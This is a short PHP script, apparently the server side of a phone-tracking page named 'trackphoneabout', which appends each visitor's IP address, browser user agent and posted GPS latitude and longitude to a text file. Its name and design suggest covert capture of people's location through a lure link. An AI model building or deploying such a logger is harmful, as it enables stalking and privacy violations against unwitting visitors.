<?php
// File: DC/log.php untuk trackphoneabout.github.io
// Simpan di folder DC sejajar dengan IP.txt

$ip = $_SERVER['REMOTE_ADDR'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? 'UNKNOWN';
$ua = $_SERVER['HTTP_USER_AGENT'] ?? 'UNKNOWN';
$lat = $_POST['lat'] ?? 'DITOLAK';
$lon = $_POST['lon'] ?? 'DITOLAK';
$time = date('Y-m-d H:i:s');

$log = "[$time] IP: $ip | UA: $ua | LAT: $lat | LON: $lon\n";
file_put_contents(__DIR__ . '/IP.txt', $log, FILE_APPEND | LOCK_EX);

header('Content-Type: text/plain');
echo "ok";
?>
